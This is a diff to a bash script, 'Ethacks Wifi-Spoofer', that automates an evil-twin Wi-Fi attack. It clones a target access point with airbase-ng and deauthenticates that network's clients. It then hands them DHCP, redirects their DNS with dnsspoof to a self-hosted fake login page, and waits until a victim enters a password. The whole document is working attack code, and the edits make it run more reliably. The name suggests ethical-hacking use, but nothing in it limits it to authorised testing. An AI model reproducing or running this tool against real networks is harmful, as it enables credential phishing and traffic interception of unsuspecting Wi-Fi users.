@@ -1,10 +1,16 @@
 #!/bin/bash
 
-echo Starting Ethacks Wifi-Spoofer
+set -e
+# Kill all background processes on exit
+trap "trap - SIGTERM && kill -- -$$" SIGTERM EXIT
+
+echo "Starting Ethacks Wifi-Spoofer"
 
 BSSID=$1
 CHANNEL=$2
 ESSID=$3
+
+AT_DEV="at0"
 
 # Setup monitor mode
 airmon-ng check kill
@@ -18,26 +24,29 @@ airmon-ng start wlan0
 # If there's no command line args then we airodump to find a BSSID to spoof
 if [ -z "$BSSID"  ] || [ -z "$CHANNEL"  ] || [ -z "$ESSID"  ]
 then
-	echo No AP information entered. Starting airodump.
-	echo Please ctrl+c once you have found the desired BSSID, Channel, and ESSID to spoof.
-	sleep 3
+	clear
+	echo "No AP information provided. Starting airodump."
+	echo "Please ctrl+c once you have found the desired BSSID, Channel, and ESSID to spoof."
+	read -p "Press enter to continue"
+
 	airodump-ng -a wlan0mon
-	echo Please enter the desired BSSID to spoof:
+
+	echo "Please enter the desired BSSID to spoof:"
 	read BSSID
-	echo Please enter the channel:
+	echo "Please enter the channel:"
 	read CHANNEL
-	echo Please enter the ESSID:
+	echo "Please enter the ESSID:"
 	read ESSID
 fi
 
 # Spoof the chosen AP
-airbase-ng -a $BSSID -c $CHANNEL -e $ESSID wlan0mon &
-
-# Boost our signal strength (may not work)
-iwconfig wlan0mon txpower 27
+airbase-ng -a "$BSSID" -c $CHANNEL -e "$ESSID" wlan0mon &
+pid_airbase=$!
+sleep 1
+echo
 
 # Allocate subnet mask
-ifconfig at0 10.0.0.1 up
+ifconfig $AT_DEV 10.0.0.1 up
 
 # Enable NAT
 iptables --flush
@@ -51,14 +60,32 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Setup DHCP
 dnsmasq -C dnsmasq.conf -d &
+pid_dnsmasq=$!
+sleep 1
+echo
 
 # Start a webserver to host the fake auth page
-# where fakeap/index.html is the fake login page
-python3 -m http.server -d fakeap 80 &
+# where portal/index.html is the fake login page
+cd portal
+python3 ../webserver.py &
+pid_webserver=$!
+cd ..
+sleep 1
+echo
 
 # Deauth all clients
-aireplay-ng --deauth 1 -a $BSSID wlan0mon
+aireplay-ng --deauth 1 -a "$BSSID" wlan0mon
+echo
 
 # Redirect client to fake auth page
-dnsspoof -i at1 &
+dnsspoof -i $AT_DEV &
+pid_dnsspoof=$!
+
+# Wait until user enters password
+wait $pid_webserver
+
+# Stop spoofing
+kill $pid_dnsspoof
+kill $pid_dnsmasq
+kill $pid_airbase
 
